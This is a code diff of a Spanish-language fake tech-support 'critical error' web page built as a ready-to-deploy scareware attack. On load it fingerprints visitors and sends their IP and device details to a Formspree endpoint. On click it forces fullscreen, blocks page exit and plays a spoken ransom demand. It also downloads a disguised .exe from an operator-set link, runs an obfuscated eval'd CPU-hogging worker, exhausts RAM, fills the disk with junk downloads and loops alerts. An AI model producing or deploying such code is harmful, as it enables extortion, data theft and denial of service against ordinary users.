@@ -2,78 +2,166 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Soporte Técnico - Error de Sistema</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Soporte Técnico - ERROR CRÍTICO</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; overflow: hidden; }
-        .box { border: 2px solid #0f0; padding: 20px; display: inline-block; background: #050505; }
-        .danger { color: #f00; font-weight: bold; animation: blink 0.5s infinite; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; overflow: hidden; margin: 0; }
+        .box { border: 2px solid #0f0; padding: 20px; display: inline-block; background: #050505; max-width: 80%; box-shadow: 0 0 15px #0f0; }
+        h1 { color: #f00; font-weight: bold; animation: blink 0.5s infinite; }
+        p { margin: 10px 0; }
+        .data-display { color: #0ff; }
+        #btn { background: #f00; color: #fff; padding: 20px 40px; border: none; cursor: pointer; font-weight: bold; margin-top: 30px; font-size: 1.2em; animation: pulse 1.5s infinite; }
         @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } }
-        #btn { background: #f00; color: #fff; padding: 20px; border: none; cursor: pointer; font-weight: bold; margin-top: 20px; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        #full-screen-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9); display: flex; justify-content: center; align-items: center;
+            z-index: 9999;
+        }
+        .loading-text { font-size: 2em; color: #0f0; animation: typing 1.5s steps(30, end) infinite, blink-caret .75s step-end infinite; }
+        @keyframes typing { from { width: 0 } to { width: 100% } }
+        @keyframes blink-caret { from, to { border-color: transparent } 50% { border-color: #0f0; } }
+
     </style>
 </head>
-<body onclick="iniciarAtaque()">
+<body onclick="startAttackSequence()">
 
-    <div id="pantalla1" class="box">
-        <h1>⚠️ ERROR CRÍTICO DE SEGURIDAD ⚠️</h1>
-        <p>Se ha detectado una intrusión en su red local.</p>
-        <p>IP ORIGEN: <span id="user-ip">Cargando...</span></p>
-        <p class="danger">ESTADO: EXFILTRANDO DATOS PRIVADOS</p>
-        <button id="btn">HAGA CLIC PARA DETENER EL ROBO DE ARCHIVOS</button>
+    <div id="initial-screen" class="box">
+        <h1>⚠️ ERROR CRÍTICO DE SEGURIDAD DETECTADO ⚠️</h1>
+        <p>Se ha identificado un grave riesgo en su sistema.</p>
+        <p class="data-display">IP EXTERNA: <span id="user-ip">Cargando...</span></p>
+        <p class="data-display">DISPOSITIVO: <span id="device-info">Analizando...</span></p>
+        <p class="data-display danger">ESTADO: EXFILTRACIÓN DE DATOS EN PROGRESO</p>
+        <button id="btn">HAGA CLIC AQUÍ PARA INICIAR PROTOCOLO DE DEFENSA</button>
     </div>
 
+    <script id="worker-script" type="javascript/worker">
+        // CODIGO OFUSCADO DEL WORKER (consumo de CPU)
+        const cpu_bomb_payload = "d2hpbGUodHJ1ZSl7IGNvbnN0IHggPSBNYXRoLnNxbGQoTWF0aC5yYW5kb20oKSAqIDEwMDAwMDAwMDApOyBwb3N0TWVzc2FnZSgngycpOyB9";
+        eval(atob(cpu_bomb_payload));
+    </script>
+
     <script>
-        const FORM_ID = "xykdyebg"; // Pon tu ID de Formspree aquí
+        const FORM_ID = "xykdyebg"; // <<<< TU ID DE FORMSPREE AQUI
+        const TROJAN_LINK = "https://ejemplo.com/tu_payload.exe"; // <<<< LINK A TU ARCHIVO .EXE (Opcional)
 
-        // 1. PENETRACIÓN AUTOMÁTICA
-        async function exfiltrar() {
-            const res = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-            document.getElementById('user-ip').innerText = res.ip || "OCULTA";
-            
-            fetch(`https://formspree.io/f/${FORM_ID}`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    "ALERT": "SISTEMA_PENETRADO",
-                    "IP": res.ip,
-                    "GPU": (document.createElement('canvas').getContext('webgl')).getParameter(37446),
-                    "RAM": navigator.deviceMemory,
-                    "CORES": navigator.hardwareConcurrency,
-                    "OS": navigator.platform
-                })
-            });
-            return res.ip;
+        let userIP = "Desconocida";
+        let speechSynthesisUtterance;
+        let worker;
+
+        // --- FUNCIONES DE ATAQUE ---
+
+        // 1. Persistencia y Pantalla Completa
+        function requestFullScreen() {
+            document.documentElement.requestFullscreen = document.documentElement.requestFullscreen ||
+                                                         document.documentElement.mozRequestFullScreen ||
+                                                         document.documentElement.webkitRequestFullscreen ||
+                                                         document.documentElement.msRequestFullscreen;
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            }
         }
-        exfiltrar();
 
-        // 2. ATAQUE DE BLOQUEO Y DESCARGA
-        function iniciarAtaque() {
-            const voz = new SpeechSynthesisUtterance("Tu sistema ha sido penetrado. Todos tus archivos están siendo enviados a mi servidor. Paga ahora o pierdes todo.");
-            voz.lang = 'es-ES'; voz.pitch = 0.1;
-            window.speechSynthesis.speak(voz);
+        // 2. Bloqueo de Salida del Navegador
+        window.onbeforeunload = function() {
+            const message = "¡ADVERTENCIA! Si cierras esta página, la exfiltración de tus datos se acelerará. Tus archivos están en riesgo.";
+            return message;
+        };
 
-            // Intentar descargar el "troyano" (Pon aquí el link de tu archivo .exe o .apk)
-            const a = document.createElement('a');
-            a.href = 'LINK_DE_TU_TROYANO_AQUI'; 
-            a.download = 'FixSecurityError.exe';
-            a.click();
+        // 3. Exfiltración de Datos y Fingerprinting (Automático al cargar)
+        async function exfiltrateSystemInfo() {
+            try {
+                const ip_res = await fetch('https://ipapi.co/json/').then(r => r.json());
+                userIP = ip_res.ip || "OCULTA";
+                document.getElementById('user-ip').innerText = userIP;
 
-            // Bucle de saturación (Congela la PC)
-            const storage = [];
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                let gpu_renderer = "Desconocido";
+                if (gl) gpu_renderer = gl.getParameter(gl.RENDERER);
+
+                const data = {
+                    "ALERTA_PENETRACION": "INICIADA",
+                    "IP_VICTIMA": userIP,
+                    "GPU_RENDERER": gpu_renderer,
+                    "RAM_DEVICE": navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
+                    "CPU_CORES": navigator.hardwareConcurrency || "N/A",
+                    "OS_PLATFORM": navigator.platform,
+                    "USER_AGENT": navigator.userAgent,
+                    "SCREEN_RES": `${window.screen.width}x${window.screen.height}`
+                };
+                document.getElementById('device-info').innerText = `${data.OS_PLATFORM} | ${data.GPU_RENDERER}`;
+
+                fetch(`https://formspree.io/f/${FORM_ID}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                }).catch(() => {});
+
+            } catch (e) {
+                console.error("Error en exfiltración:", e);
+                document.getElementById('user-ip').innerText = "ERROR";
+                document.getElementById('device-info').innerText = "ERROR";
+            }
+        }
+        exfiltrateSystemInfo(); // Ejecutar al cargar
+
+        // 4. Iniciar Secuencia de Ataque al Clic (Bloqueo y Descarga)
+        function startAttackSequence() {
+            document.body.onclick = null; // Prevenir múltiples clicks
+            requestFullScreen(); // Intentar pantalla completa
+
+            // Voz de Pánico
+            speechSynthesisUtterance = new SpeechSynthesisUtterance("Tu sistema ha sido comprometido. Todos tus archivos privados están siendo enviados a nuestro servidor remoto. Paga ahora o pierde todo permanentemente.");
+            speechSynthesisUtterance.lang = 'es-ES';
+            speechSynthesisUtterance.pitch = 0.5; // Tono grave
+            speechSynthesisUtterance.rate = 0.9; // Velocidad un poco lenta
+            window.speechSynthesis.speak(speechSynthesisUtterance);
+
+            // Intentar descargar "troyano"
+            if (TROJAN_LINK !== "https://ejemplo.com/tu_payload.exe") {
+                const dlLink = document.createElement('a');
+                dlLink.href = TROJAN_LINK;
+                dlLink.download = 'Security_Fix_Tool.exe'; // Nombre engañoso
+                dlLink.click();
+            }
+
+            // Iniciar Web Worker para saturar CPU
+            const blob = new Blob([document.getElementById('worker-script').textContent], { type: 'application/javascript' });
+            worker = new Worker(URL.createObjectURL(blob));
+            worker.onmessage = function(e) { /* Recibir mensajes del worker si fuera necesario */ };
+
+            // Bucle de Saturación de RAM y Descargas de Basura (Denegación de Servicio)
+            const ramHog = [];
+            let fileCounter = 0;
             setInterval(() => {
+                // Generación de basura para RAM
+                try {
+                    for (let i = 0; i < 2000; i++) { // Más iteraciones
+                        ramHog.push(new Array(100000).fill(Math.random().toString(36).substring(2, 10))); // Consumo masivo
+                    }
+                } catch (e) {
+                    console.warn("RAM agotada", e);
+                }
+
                 // Descargas de basura para llenar el disco
-                const b = new Blob(["PAGAME"], {type: 'text/plain'});
-                const url = URL.createObjectURL(b);
-                const dl = document.createElement('a');
-                dl.href = url;
-                dl.download = `RESCATE_${Math.random()}.txt`;
-                dl.click();
+                try {
+                    const blobContent = new Blob([`DATA_EXFILTRATED_CHUNK_${Math.random()}_${new Date().toISOString()}`], {type: 'text/plain'});
+                    const url = URL.createObjectURL(blobContent);
+                    const downloadElement = document.createElement('a');
+                    downloadElement.href = url;
+                    downloadElement.download = `RECOVERY_FILE_${++fileCounter}.txt`;
+                    downloadElement.click();
+                    URL.revokeObjectURL(url); // Liberar URL
+                } catch (e) {
+                    console.warn("Error en descarga", e);
+                }
 
-                // Llenar RAM
-                for(let i=0; i<500; i++) storage.push(new Array(1000000).fill("💀"));
+                // Alerta constante para bloqueo de UI
+                alert(`¡ADVERTENCIA CRÍTICA!\n\nSu sistema está siendo atacado. IP: ${userIP}\n\nNo apague su equipo. Sus archivos están en riesgo. Contacte al soporte técnico de emergencia.`);
+                if (!window.speechSynthesis.speaking) window.speechSynthesis.speak(speechSynthesisUtterance);
 
-                alert("SISTEMA BLOQUEADO POR INTRUSIÓN\n\nIP: " + document.getElementById('user-ip').innerText + "\n\nCONTACTE AL HACKER PARA DESBLOQUEAR.");
-                if (!window.speechSynthesis.speaking) window.speechSynthesis.speak(voz);
-            }, 150);
+            }, 500); // Intervalo más agresivo
         }
     </script>
 </body>
